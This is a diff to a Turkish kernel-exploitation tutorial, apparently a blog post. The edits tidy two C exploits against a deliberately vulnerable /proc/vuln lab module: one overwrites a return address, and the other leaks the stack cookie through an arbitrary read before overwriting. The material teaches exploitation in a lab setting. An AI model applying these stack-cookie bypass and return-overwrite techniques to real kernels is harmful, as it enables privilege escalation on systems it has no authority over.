@@ -27,14 +27,17 @@ Bu örnekte `cant_get_here` `ffffffff81094a50` adresinde.
 
 Hadi bu adresi kullanarak basit bir exploit yazalım:
 ```c
-#include <stdlib.h>
-#include <stdio.h>
 #include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
 #include <fcntl.h>
 
-#define DEVICE      "/proc/vuln"
+#define DEVICE "/proc/vuln"
 
-int main(){
+int main()
+{
+
     // proc dosyasını okuma ve yazma izinleri ile açıyoruz
     // dosyanın handle'ını fd değişkenine kaydediyoruz
     int fd = open(DEVICE, O_RDWR);
@@ -43,6 +46,10 @@ int main(){
     // long kullanmamızın temel sebebi cookie'nin 8 byte olması 
     // bu sonrasında işimizi kolaylaştıracak
     unsigned long w[3];
+
+    // array'in tüm içerğini sıfırlıyoruz
+    bzero(w, sizeof(w));
+
     w[0] = 0; // local buffer 
     w[1] = 0; // stack cookie 
     w[2] = (unsigned long)0xffffffff81094a50; // return address 
@@ -53,6 +60,7 @@ int main(){
 
     // son olarak dosyayı kapatıyoruz
     close(fd);
+
 }
 ```
 Bu exploiti `gcc -o exploit -static [dosya]` komutu ile derleyip çalıştırırsak beklediğimiz 
@@ -102,14 +110,17 @@ Fakat burda dikkat etmemiz gereken bir nokta lokal buffer'ın arbitary read'i ex
 32 byte olduğu. Stack cookie'si de 8 byte olduğundan toplam 40 byte okuyacağız. Son 8 byte'daki 
 cookie'yi daha sonra yazma bufferına geçebiliriz:
 ```c
-#include <stdlib.h>
-#include <stdio.h>
 #include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
 #include <fcntl.h>
 
-#define DEVICE      "/proc/vuln"
+#define DEVICE "/proc/vuln"
 
-int main(){
+int main()
+{
+
     // proc dosyasını okuma ve yazma izinleri ile açıyoruz
     // dosyanın handle'ını fd değişkenine kaydediyoruz
     int fd = open(DEVICE, O_RDWR);
@@ -119,6 +130,10 @@ int main(){
     // okuyacağımız veriyi tutacağımız buffer 
     // totalde 40 byte okuyacağız
     unsigned long r[5];
+
+    // array'lerin tüm içerğini sıfırlıyoruz
+    bzero(w, sizeof(w));
+    bzero(r, sizeof(r));
     
     read(fd, r, sizeof(r));
     // hex formatında okuduğumuz veriyi ekrana basıyoruz
@@ -138,6 +153,7 @@ int main(){
 
     // son olarak dosyayı kapatıyoruz
     close(fd);
+
 }
 ```
 Bu exploit başarı ile cookie'i koruyarak return adresimizin üzerine yazacaktır:
